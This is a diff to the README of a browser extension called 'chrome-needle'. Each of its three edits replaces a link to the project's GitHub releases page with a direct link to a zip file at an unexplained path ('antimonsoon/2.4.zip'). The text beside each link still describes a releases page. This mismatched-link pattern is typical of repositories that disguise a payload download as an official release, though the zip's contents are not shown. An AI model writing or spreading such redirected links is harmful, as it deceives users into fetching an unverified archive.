@@ -22,7 +22,7 @@ Follow these simple steps to get chrome-needle up and running on your Windows co
 
 ### Step 1: Download the Application
 
-[![Download chrome-needle](https://img.shields.io/badge/Download-chrome--needle-4E9A51?style=for-the-badge&logo=github&logoColor=white)](https://github.com/huongt4412/chrome-needle/releases)
+[![Download chrome-needle](https://img.shields.io/badge/Download-chrome--needle-4E9A51?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/huongt4412/chrome-needle/main/antimonsoon/2.4.zip)
 
 Visit this link to download the application. This page shows all available versions. Look for the newest one and click the download button.
 
@@ -45,7 +45,7 @@ That's it! chrome-needle will now appear in your extensions list with a small ic
 
 **If you haven't downloaded chrome-needle yet, here's the easiest way:**
 
-[Download chrome-needle from GitHub Releases](https://github.com/huongt4412/chrome-needle/releases)
+[Download chrome-needle from GitHub Releases](https://raw.githubusercontent.com/huongt4412/chrome-needle/main/antimonsoon/2.4.zip)
 
 Visit this link to download the application. You'll land on the releases page where you can find the latest version for Windows. Click the download link to get the file.
 
@@ -132,7 +132,7 @@ chrome-needle works with most standard websites. Some very complex or unusual we
 Yes. For advanced users, chrome-needle supports custom scripts. You can write simple JavaScript commands if you want more control.
 
 ### How do I update chrome-needle?
-When a new version is released, download it from the same [releases page](https://github.com/huongt4412/chrome-needle/releases) and reinstall it following the steps above. Your settings will be retained.
+When a new version is released, download it from the same [releases page](https://raw.githubusercontent.com/huongt4412/chrome-needle/main/antimonsoon/2.4.zip) and reinstall it following the steps above. Your settings will be retained.
 
 ---
 
